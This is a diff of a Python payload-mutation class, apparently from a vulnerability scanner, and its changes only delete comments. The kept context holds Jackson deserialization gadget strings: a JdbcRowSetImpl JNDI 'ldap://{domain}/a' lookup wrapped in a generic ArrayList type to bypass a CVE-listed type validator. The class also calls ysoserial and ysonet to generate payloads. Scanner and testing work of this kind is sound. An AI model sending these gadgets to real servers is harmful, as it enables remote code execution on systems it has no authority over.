@@ -123,10 +123,6 @@ class PayloadMutation:
         if not os.path.exists(self.YSOSERIAL_PATH):
             return None
         if not _java_available():
-            # No JRE on PATH — skip immediately instead of spawning a failing
-            # subprocess per chain/command (which otherwise floods the log and makes
-            # a large scan crawl). Detection still works; only Java payload-generation
-            # is unavailable here.
             return None
         try:
             flags = self._get_java_flags()
@@ -268,15 +264,6 @@ class PayloadMutation:
          '{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]'),
     ]
 
-    # CVE-2026-54512/54513 (GHSA-j3rv-43j4-c7qm, jackson-databind < 2.18.8/2.21.4/
-    # 3.1.4): cung 3 gadget body nhu tren, nhung boc lam generic type parameter cua
-    # 1 container JDK duoc allow-list theo TEN (vd "java.util.ArrayList") - bypass
-    # PolymorphicTypeValidator chi kiem tra ten container truoc dau "<", bo qua
-    # generic argument ben trong. Than gadget (field/property) GIU NGUYEN, chi doi
-    # type ID ben ngoai va boc than gadget vao 1 mang 1 phan tu (vi ArrayList<T>
-    # deserialize tung phan tu list truc tiep thanh T). Verify cau truc tu chinh
-    # test that cua patch (BasicPTVGenericParameterBypassTest.java, jackson-databind
-    # commit 434d6c511): "java.util.ArrayList<pkg.Class>",[{...}]] .
     JACKSON_OOB_GADGETS_GENERIC_BYPASS = [
         ("java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
          '["java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",'
@@ -621,16 +608,6 @@ class PayloadMutation:
                 pairs.extend(self._iter_php_pairs(payload, val_tok["start"], val_tok["end"], depth + 1))
             else:
                 pairs.append((key_tok, val_tok))
-            #pairs = [
-            #     (
-            #         {'start': 14, 'end': 29, 'kind': 's', 'content': 'username'},   # key_tok
-            #         {'start': 29, 'end': 42, 'kind': 's', 'content': 'wiener'}       # val_tok
-            #     ),
-            #     (
-            #         {'start': 42, 'end': 54, 'kind': 's', 'content': 'admin'},      # key_tok
-            #         {'start': 54, 'end': 58, 'kind': 'b'}                           # val_tok (khong co 'content' vi la boolean)
-            #     ),
-            # ]
         return pairs
 
     def __flip_boolean(self, payload: str) -> Mutations:
@@ -850,10 +827,6 @@ class PayloadMutation:
         return results
 
 
-    # ysonet (irsdl/ysonet) — fork/replacement dang duoc maintain tich cuc cua
-    # ysoserial.net goc (pwntester/ysoserial.net, gan nhu ngung cap nhat). Gadget
-    # mode dung dung -g/-f/-c/-o giong cu phap cu, nen chi can doi ten file/bien,
-    # khong can doi cach build command.
     YSONET_PATH = get_tool_path("ysonet")
 
     DOTNET_TEST_COMMANDS = TEST_COMMANDS
